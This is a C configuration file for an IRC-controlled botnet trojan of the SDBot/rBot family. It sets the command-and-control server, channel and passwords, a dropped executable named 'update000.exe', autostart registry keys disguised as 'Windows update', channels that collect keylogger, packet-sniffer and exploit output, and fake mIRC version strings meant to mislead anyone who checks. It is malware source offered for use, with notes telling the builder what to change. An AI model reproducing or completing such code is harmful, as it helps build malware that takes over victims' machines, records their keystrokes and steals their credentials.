// bot configuration (generic) - doesn't need to be encrypted
int port = 6667;				// server port
int port2 = 7000;				// backup server port
int socks4port = 38;			// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 69;				// Port # for tftp daemon to run on
int httpport = 80;			// Port # for http daemon to run on
int rloginport = 513;			// Port # for rlogin daemon to run on
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = TRUE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '.';				// command prefix (one character max.)
int maxrand = 5;				// how many random numbers in the nick
int nicktype = CONSTNICK;		// nick type (see rndnick.h)
BOOL nickprefix = TRUE;			// nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="c:\\system.txt";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!

#else  // Recommended to use this only for Crypt() setup, this is unsecure.

char botid[] = "Robpwns";						// bot id
char version[] = "Gigas";		// Bots !version reply
char password[] = "Robs";					// bot password
char server[] = "irc.ass.user.name";		// server
char serverpass[] = "";						// server password
char channel[] = "#GTA";				// channel that the bot should join
char chanpass[] = "GTAPWNS";						// channel password
char server2[] = "irc.ass.user.name";						// backup server (optional)
char channel2[] = "#GTA";						// backup channel (optional)
char chanpass2[] = "GTAPWNS";						// backup channel password (optional)
char filename[] = "update000.exe";			// destination file name
char keylogfile[] = "logfile.txt";				// keylog filename
char valuename[] = "Windows update";		// value name for autostart
char nickconst[] = "[GTA]-";					// first part to the bot's nick
char szLocalPayloadFile[]="payload";	// Payload filename
char modeonconn[] = "+x";					// Can be more than one mode and contain both + and -
char exploitchan[] = "#GTA";					// Channel where exploit messages get redirected
char keylogchan[] = "#GTA";						// Channel where keylog messages get redirected
char psniffchan[] = "#GTA";						// Channel where psniff messages get redirected 

char *authost[] = {
	"*@fucku.gov"
};

char *versionlist[] = {
	"mIRC v6.12 Khaled Mardam-Bey",
	"mIRC v6.03 Khaled Mardam-Bey",
	"mIRC32 v5.82 K.Mardam-Bey",
	"mIRC32 v6.01 K.Mardam-Bey",
	"mIRC32 v6.03 K.Mardam-Bey",
	"mIRC32 v6.12 K.Mardam-Bey",
	"mIRC v5.71 K.Mardam-Bey",
	"mIRC v5.82 K.Mardam-Bey",
	"mIRC v6.01 K.Mardam-Bey",
	"mIRC v6.03 K.Mardam-Bey",
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "2pckiws19f3bw"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif
